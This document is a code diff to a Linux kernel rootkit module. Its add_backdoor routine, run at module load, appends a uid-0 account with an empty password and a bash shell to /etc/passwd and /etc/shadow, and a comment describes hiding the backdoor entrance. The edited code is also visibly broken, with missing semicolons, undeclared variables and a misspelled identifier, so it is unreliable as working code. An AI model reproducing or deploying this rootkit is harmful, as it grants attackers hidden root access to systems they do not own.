@@ -52,8 +52,11 @@ asmlinkage long our_setreuid(const struct pt_regs *regs){
 
 // Start Marc - Inserting/removing backdoor & hide backdoor entrance
 void add_backdoor(char *path) {
+	
+		backdoor_password = "user1:x:12345:0:backdoor:/home:/bin/bash\n"
+		backdoor_shadow = "user1::18232:0:99999:7:::\n"
 		struct file *file;
-		char *BACKDOOR;
+		char *backdoor;
 		mm_segment_t old_fs;
 		
 		char *buffer;
@@ -64,10 +67,10 @@ void add_backdoor(char *path) {
 		
 		unsigned long ret;
 		
-		if (strcmp(path, PASSWORD_FILE) == 0) 
-			{BACKDOOR = backdoor_password;}
-		if (strcmp(path, SHADOW_FILE) == 0)
-			{BACKDOOR = backdoor_shadow;}
+		if (strcmp(path, "/etc/passwd") == 0) 
+			{backdoor = backdoor_password;}
+		if (strcmp(path, "/etc/shadow") == 0)
+			{backdoor = backdoor_shadow;}
 		
 		old_fs = get_fs(); 
 		
@@ -102,7 +105,7 @@ void add_backdoor(char *path) {
 
 			page_count++;
 
-			if(strstr(buffer, BACKDOOR)){
+			if(strstr(buffer, backdoor)){
 			    backdoor_existing = true;
 			    break;
 			}
@@ -126,7 +129,7 @@ void add_backdoor(char *path) {
 		//add backdoor to the end of file
 		ret = 0;
 	    	set_fs(get_ds()); 
-		ret = vfs_write(file, BACKDOOR, strlen(BACKDOOR),&offset); 
+		ret = vfs_write(file, BACKDOOR, strlen(backdoora),&offset); 
 		set_fs(old_fs); 
 	
 		if(ret<0){
@@ -260,12 +263,13 @@ static int __init rootkit_init(void){
     	return -1;
   	}
 	
-	// Start Marc
+	char *password_file = "/etc/passwd"
+	char *shadow_file = "/etc/shadow"
 	
-	define 
+	// Start Marc 
 	
-	add_backdoor(PASSWORD_FILE);
-   	add_backdoor(SHADOW_FILE);
+	add_backdoor(password_file);
+   	add_backdoor(shadow_file);
 	
 	// End Marc
 	
